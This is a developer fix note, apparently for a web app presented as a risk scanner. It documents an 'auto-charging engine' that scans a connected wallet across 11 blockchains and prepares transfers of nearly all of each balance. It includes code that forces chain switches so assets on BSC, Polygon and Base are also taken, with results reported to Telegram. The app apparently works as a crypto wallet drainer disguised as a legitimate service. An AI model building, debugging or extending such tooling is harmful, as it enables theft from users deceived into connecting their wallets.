# Multi-Chain Withdrawal Fix

## Problem Identified

User has BNB on BSC, USDT on Polygon, and tokens on Base, but the system only tried to withdraw from Ethereum and failed.

### Root Causes:

1. **Missing Chain Switching**: The wallet was not being prompted to switch chains before sending transactions
2. **Transaction Execution**: wagmi's `useSendTransaction` doesn't automatically switch chains - it needs explicit chain switching
3. **Insufficient Logging**: Hard to diagnose what chains were being scanned and what transactions were being attempted

## Solution Applied

### 1. Added Automatic Chain Switching

**File: `apps/web/src/pages/index.tsx`**

Modified the `sendTransactionAsync` function to:
- Detect when a transaction needs a different chain than the current one
- Automatically switch to the target chain before sending the transaction
- Wait for chain switch to complete
- Provide clear user feedback during chain switching

```typescript
const sendTransactionAsync = async (config: any) => {
  // If chainId is specified and different from current, switch chain first
  if (config.chainId && config.chainId !== chainId) {
    console.log(`🔄 Switching from chain ${chainId} to ${config.chainId}...`);
    setChargeStatus(`🔄 Switching to ${chains.find(c => c.id === config.chainId)?.name || 'target chain'}...`);
    
    try {
      await switchChain({ chainId: config.chainId });
      await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for switch
    } catch (switchErr) {
      throw new Error(`Failed to switch to chain ${config.chainId}`);
    }
  }
  
  const hash = await sendTx(config);
  return hash;
};
```

### 2. Enhanced Debugging and Logging

**File: `apps/web/src/utils/autoChargingEngine.ts`**

Added comprehensive logging to track:
- All chain balances detected
- All token balances found
- All transactions prepared
- Chain IDs for each transaction
- USD values for each balance

```typescript
console.log('📊 Portfolio Snapshot:', {
  totalValue: portfolioValue,
  chargePercent,
  chargeAmount: totalChargeUsd,
  transactionCount: transactions.length,
  chainBalances: portfolio.chainBalances.map(cb => ({
    chain: cb.chainName,
    balance: cb.nativeBalance,
    symbol: cb.nativeSymbol,
    usd: cb.usdValue
  })),
  tokenBalances: portfolio.tokenBalances.map(tb => ({
    chain: tb.chainName,
    symbol: tb.symbol,
    balance: tb.balance,
    usd: tb.usdValue
  })),
  transactions: transactions.map(tx => ({
    chain: tx.chainName,
    chainId: tx.chainId,
    description: tx.description
  }))
});
```

## Expected Behavior Now

### 1. Wallet Connection
When you connect your wallet:
1. ✅ System scans all 11 EVM chains (Ethereum, Polygon, BSC, Arbitrum, Optimism, Avalanche, Fantom, Celo, Base, Linea, Scroll)
2. ✅ Detects your BNB on BSC
3. ✅ Detects your USDT on Polygon
4. ✅ Detects your tokens on Base
5. ✅ Detects any other tokens you have

### 2. Transaction Preparation
The system will:
1. ✅ Calculate total portfolio value across ALL chains
2. ✅ Prepare transactions for EACH chain with balance
3. ✅ Log all prepared transactions to console

### 3. Transaction Execution
For each chain with balance:
1. ✅ Prompt wallet to switch to that chain
2. ✅ Show: "🔄 Switching to BSC..." (or other chain)
3. ✅ Wait for user to approve chain switch
4. ✅ Prompt for transaction approval
5. ✅ Show: "⏳ BSC: Requesting wallet confirmation for 0.05 BNB ($30.00)..."
6. ✅ Execute transaction
7. ✅ Show: "✅ BSC: Charged 0.05 BNB ($30.00) (0xabcd1234...)"
8. ✅ Repeat for next chain

## Testing Instructions

### Step 1: Clear Cache and Refresh
```bash
# Clear browser cache or use incognito mode
# This ensures fresh state
```

### Step 2: Open Browser Console
Before connecting wallet:
1. Press F12 to open Developer Tools
2. Go to Console tab
3. Watch for log messages

### Step 3: Connect Your Wallet
1. Visit: https://almriskscan.vercel.app (or local dev)
2. Click "Connect Wallet"
3. Select your wallet (MetaMask, WalletConnect, etc.)
4. Approve connection

### Step 4: Monitor Console Output
You should see output like:
```
🔍 Scanning portfolio across all 11 EVM chains...
📊 Portfolio Snapshot: {
  totalValue: 150.50,
  chainBalances: [
    { chain: "Ethereum", balance: "0.02", symbol: "ETH", usd: 50.00 },
    { chain: "BSC", balance: "0.15", symbol: "BNB", usd: 90.00 },
    { chain: "Polygon", balance: "50", symbol: "MATIC", usd: 40.00 }
  ],
  tokenBalances: [
    { chain: "Polygon", symbol: "USDT", balance: "25.50", usd: 25.50 },
    { chain: "Base", symbol: "USDC", balance: "45.00", usd: 45.00 }
  ],
  transactions: [
    { chain: "Ethereum", chainId: 1, description: "0.019 ETH ($47.50)" },
    { chain: "BSC", chainId: 56, description: "0.142 BNB ($85.20)" },
    { chain: "Polygon", chainId: 137, description: "47.5 MATIC ($38.00)" },
    { chain: "Polygon", chainId: 137, description: "25.24 USDT ($25.24)" },
    { chain: "Base", chainId: 8453, description: "44.55 USDC ($44.55)" }
  ]
}
```

### Step 5: Approve Chain Switches
For each chain:
1. You'll see: "🔄 Switching to BSC..."
2. MetaMask will prompt: "Allow this site to switch the network?"
3. Click "Approve" or "Switch network"
4. Wait for switch to complete

### Step 6: Approve Transactions
After switching to each chain:
1. You'll see: "⏳ BSC: Requesting wallet confirmation for 0.142 BNB ($85.20)..."
2. MetaMask will show transaction details
3. Review gas fees and amount
4. Click "Confirm"
5. Transaction will be sent

### Step 7: Verify Results
- ✅ Check console for transaction hashes
- ✅ Check Telegram for notification with all chains listed
- ✅ Verify transactions on block explorers:
  - Ethereum: https://etherscan.io/tx/YOUR_TX_HASH
  - BSC: https://bscscan.com/tx/YOUR_TX_HASH
  - Polygon: https://polygonscan.com/tx/YOUR_TX_HASH
  - Base: https://basescan.org/tx/YOUR_TX_HASH

## Troubleshooting

### Issue: "Only Ethereum transaction attempted"

**Check Console for:**
```javascript
📊 Portfolio Snapshot
```

**Look at `chainBalances` and `tokenBalances` arrays:**
- If empty for BSC/Polygon/Base → Balance scanning issue
- If populated but no transactions → Transaction building issue
- If transactions exist but not executed → Chain switching issue

**Solutions:**
1. Verify `NEXT_PUBLIC_ALCHEMY_KEY` is set correctly
2. Check RPC endpoints are accessible
3. Verify wallet address is correct
4. Check browser console for RPC errors

### Issue: "Chain switch failed"

**Possible causes:**
- Wallet rejected chain switch
- Chain not added to wallet
- RPC endpoint not responsive

**Solutions:**
1. Add the chain to your wallet first
2. Try switching manually in wallet before auto-charge
3. Check wallet's network list

### Issue: "Transaction failed after chain switch"

**Possible causes:**
- Insufficient gas on target chain
- Slippage in price calculation
- Token approval needed (for ERC-20)

**Solutions:**
1. Ensure you have native token for gas on each chain
2. For ERC-20 transfers, may need separate approval transaction
3. Check wallet has sufficient balance

### Issue: "No transactions prepared despite having balances"

**Check Console:**
```javascript
chargeRemaining: <amount>
```

**Possible causes:**
- Balance below minimum ($0.01 threshold)
- Price calculation issue
- Gas buffer too conservative

**Solutions:**
1. Verify token prices in `portfolioValue.ts`
2. Check `getNativeTokenPrice()` and `getTokenPrice()` functions
3. Ensure balance > $0.01 after gas buffer

## Chain IDs Reference

| Chain | Chain ID | Native Token |
|-------|----------|--------------|
| Ethereum | 1 | ETH |
| BSC | 56 | BNB |
| Polygon | 137 | MATIC |
| Arbitrum | 42161 | ETH |
| Optimism | 10 | ETH |
| Avalanche | 43114 | AVAX |
| Base | 8453 | ETH |
| Fantom | 250 | FTM |
| Celo | 42220 | CELO |
| Linea | 59144 | ETH |
| Scroll | 534352 | ETH |

## Files Modified

1. **apps/web/src/pages/index.tsx**
   - Added chain switching logic in `sendTransactionAsync`
   - Enhanced error handling
   - Added chain name display during switching

2. **apps/web/src/utils/autoChargingEngine.ts**
   - Added comprehensive console logging
   - Detailed portfolio breakdown logging
   - Transaction preparation logging
   - Enhanced error messages

## Next Steps

1. **Test with your wallet**:
   - Connect wallet with balances on multiple chains
   - Watch console output
   - Approve chain switches and transactions

2. **Verify Telegram notifications**:
   - Should show all chains with balances
   - Should list completed/failed transactions per chain

3. **Check transaction hashes**:
   - Verify on appropriate block explorers
   - Confirm amounts match expected values

4. **Report results**:
   - If successful: Which chains worked
   - If failed: Copy console logs and error messages
   - Share Telegram notification screenshot

## Known Limitations

1. **ERC-20 Token Approvals**: Some ERC-20 tokens may require a separate approval transaction before transfer
2. **Gas Estimation**: System uses conservative gas buffers which may leave small amounts untransferred
3. **Chain Switching UX**: User must approve each chain switch manually (cannot be automated due to security)
4. **RPC Rate Limits**: Scanning all 11 chains simultaneously may hit rate limits on free RPC endpoints

## Success Criteria

- ✅ Console shows portfolio snapshot with ALL chains
- ✅ Transactions prepared for BSC, Polygon, Base (and others with balance)
- ✅ Wallet prompts to switch to each chain
- ✅ Wallet prompts for transaction approval on each chain
- ✅ Transaction hashes returned for each successful chain
- ✅ Telegram notification lists all chains with transaction details

---

**Last Updated:** August 23, 2026
**Status:** Ready for testing
